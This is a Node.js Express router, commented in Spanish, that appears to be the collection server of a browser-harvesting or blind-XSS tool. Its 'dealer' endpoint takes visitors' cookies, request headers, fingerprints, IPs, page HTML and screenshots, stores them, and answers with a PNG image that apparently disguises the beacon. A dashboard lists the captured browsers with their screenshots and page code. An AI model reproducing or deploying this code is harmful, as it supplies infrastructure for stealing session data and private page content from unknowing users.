const express = require('express');
const router = express.Router();
const { Log } = require('../Functions/db'); // Modelo Sequelize
const { Op } = require('../Functions/db'); // Base de datos
const sequelize = require('sequelize'); // Asegúrate de importar Sequelize correctamente

const { renderTemplate, processDealerData } = require('../Functions/utils');

const fs = require('fs');
const path = require('path');


// Define las funciones web dentro del objeto `webfuncs`
const webfuncs = {
    indexHandler: (req, res) => {
        const filePath = path.join(__dirname, '../Web/index.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });
    },
    dashboard: async (req, res) => {
        try {
            const logs = await Log.findAll({
                attributes: [
                    [sequelize.fn('MAX', sequelize.col('Ts')), 'latestTs'], // Obtener el último Ts
                    'Fb', // Mantener el Fb único
                    'Fu', // Fingerprint for user 
                    'Ip', // IP
                    'Ts', // TimeStamp 
                    'Dl', // Dealer/Data
                    'Er', // 
                    'Ed', // 
                    'ID', // 
                    'Fr', // 
                    'Jd', // 
                    'html', // 
                    'screen' // Screenshots 
                ],
                where: {
                    Fu: { [Op.ne]: '' || 'N/B' },
                    Fb: { [Op.ne]: '' },
                    Ip: { [Op.ne]: '' },
                },
                group: ['Fb'], // Agrupar por Fb para eliminar duplicados
                order: [[sequelize.fn('MAX', sequelize.col('Ts')), 'DESC']], // Ordenar por el último Ts
            });
    
            await renderTemplate(res, 'Web/browsers.html', { logs });
        } catch (err) {
            console.error('[5ELG] Error querying database:', err);
            res.status(500).send('Error loading dashboard.');
        }
    },
        
    createLog: (req, res) => {
        // Código para crear un nuevo log
        res.send('Create log logic goes here.');
    },
    infoIP: async (req, res) => {
        try {
            if (!req.query.id) {
                return res.status(400).send('Error: Falta el parámetro "id".');
            }
            idreq = req.query.id;
            await renderTemplate(res, 'Web/infoIPX.html', { idreq }); //ASD

        } catch (error) {
            console.log(error);
            
        }
    },
    infoDeal: async (req, res) => {
        try {
            // Validar si se ha proporcionado un ID
            if (!req.query.id) {
                return res.status(400).send('Error: Falta el parámetro "id".');
            }
    
            // Buscar el registro en la base de datos
            var result = await Log.findAll({
                where: {
                    Fr: { [Op.eq]: req.query.id }, 
                },
            });

            // Construir las rutas de los archivos Base64
            const screenshotDir = path.join(__dirname, '../Sources/screenshotsB64');
            const shotPath = path.join(screenshotDir, `${req.query.id}.shot`);
            const codePath = path.join(screenshotDir, `${req.query.id}.code`);

            // Leer los archivos Base64 (si existen)
            let base64Shot = null;
            let base64Code = null;

            if (fs.existsSync(shotPath)) {
                base64Shot = fs.readFileSync(shotPath, 'utf8'); // Leer archivo como texto
            } else {
                console.warn(`[5ELG] Archivo no encontrado: ${shotPath}`);
            }

            if (fs.existsSync(codePath)) {
                base64Code = fs.readFileSync(codePath, 'utf8'); // Leer archivo como texto
            } else {
                console.warn(`[5ELG] Archivo no encontrado: ${codePath}`);
            }
    
            // Verificar si se encontraron resultados
            if (result.length === 0) {
                return res.status(404).send('Error: No se encontraron datos para el ID proporcionado.');
            }
    
            // Renderizar la plantilla con los datos encontrados
            // Renderizar la plantilla con los datos encontrados y los Base64
            await renderTemplate(res, 'Web/info.html', { 
                result, 
                base64Shot, 
                base64Code 
            });
            
        } catch (err) {
            // Manejo de errores y envío de respuesta al cliente
            console.error('[5ELG] Error procesando la solicitud:', err.message);
            res.status(500).send('Error procesando la solicitud.');
        }
    },    
    scope: (req, res) => {
        const filePath = path.join(__dirname, '../Web/scope.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });          
    },
    callback: (req, res) => {
        const filePath = path.join(__dirname, '../Web/callback.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });        
    },
    dataDealer: (req, res) => {
        // Código para manejar "data-dealer"
        res.send('Data dealer handler logic goes here.');
    },
    dataLogs: (req, res) => {

        const filePath = path.join(__dirname, '../Web/statics.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });  
    },
    dealer: async (req, res) => {
         var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || '';
         var userAgent = req.body.Ua || req.headers['user-agent'] || '';

         // Obtener los parámetros del request
         var fpUser = req.body.u || ''; // Parámetro "u"
         var fpBrowser = req.body.b || ''; // Parámetro "b"
         var fpRequest = req.body.r || ''; // Parámetro "r"
         var jsData = req.body.data || ''; // Datos JS
         var encodedPage = req.body.code || ''; // Página codificada
         var encodedScr = req.body.s || ''; // Captura de pantalla codificada
         var rts = req.body.ts || ''; // Captura de pantalla codificada

         // Obtener las cookies
         var cookies = {};
         (req.cookies || []).forEach((cookie) => {
             cookies[cookie.name] = cookie.value;
         });

         // varruir el objeto `requestData` con información adicional de la petición
         var requestData = {
             headers: req.headers, // Todas las cabeceras de la petición
             cookies: cookies, // Cookies obtenidas
             requestURL: req.originalUrl || req.url, // URL de la petición
             method: req.method, // Método HTTP (GET, POST, etc.)
             dealer_uri: req.headers['origin'] || '', // Origen de la petición
             merca_uri: req.headers['referer'] || '', // Referer (si está disponible)
         };

         // Codificar la información de la petición en Base64
         var encodedReq = Buffer.from(JSON.stringify(requestData)).toString('base64');

        var detectdata = false;
        // Si es una solicitud GET normal, devolver el archivo HTML
        if (req.method === 'GET') {
            var filePath = path.join(__dirname, '../Web/merca.html'); // Ruta del archivo HTML
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error('[!] Error al leer el archivo HTML:', err.message);
                    res.status(500).send('ERROR'); // Respuesta con error 500
                    return;
                }

                res.status(200).send(data); // Enviar el contenido del archivo HTML
            });
            return;
        }

        if (req.path.endsWith('.png')) {        
            detectdata = true;
        } 
        
        if (req.method === 'POST') {
            detectdata = true;  
        } 

        if (detectdata) {
            processDealerData({ fpRequest, encodedScr, encodedPage, jsData, encodedReq, rts, ip, userAgent, fpUser, fpBrowser })
        }
        res.setHeader('Content-Type', 'image/png');
        const imagePath = path.join(__dirname, '../Web/assets/img/1.png');
        return res.sendFile(imagePath, (err) => {
            if (err) {
                console.error('[DealerHandler] Error al enviar el archivo PNG:', err.message);
                res.status(500).send('Error al enviar la imagen');
            }
        });
    },
    dealerData: (req, res) => {
        //database.html
        const filePath = path.join(__dirname, '../Web/database.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });  
    },
    filesRecAndData: (req, res) => {
        //database.html
        const filePath = path.join(__dirname, '../Web/files.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });  
    },
    optionsData: (req, res) => {
        //database.html
        const filePath = path.join(__dirname, '../Web/options.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });  
    },
    scannersData: (req, res) => {
        //database.html
        const filePath = path.join(__dirname, '../Web/scanners.html'); // Ruta del archivo HTML

        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) {
                console.error('[!] Error al leer el archivo HTML:', err.message);
                res.status(500).send('ERROR'); // Respuesta con error 500
                return;
            }
    
            res.status(200).send(data); // Enviar el contenido del archivo HTML
        });  
    },
};


router.use('/dashboard', webfuncs.dashboard); 
router.use('/info', webfuncs.infoDeal); 
router.use('/ipdata', webfuncs.infoIP); 

router.use('/callback', webfuncs.callback); 
router.use('/dealers', webfuncs.dealerData); 
router.use('/scanners', webfuncs.scannersData); 
router.use('/files', webfuncs.filesRecAndData); 
router.use('/options', webfuncs.optionsData); 

router.use('/statics', webfuncs.dataLogs); 
router.use('/upload', webfuncs.scope); //FILE UPLOAD

router.use('/logs', webfuncs.createLog); 
//INTERNAL DEALER EXEMPLE
router.use('/dealer', webfuncs.dealer); 
router.use('/dealer.png', webfuncs.dealer); 
router.use('/', webfuncs.indexHandler); 

// Exportar el router para que pueda ser utilizado en el servidor principal
module.exports = router;
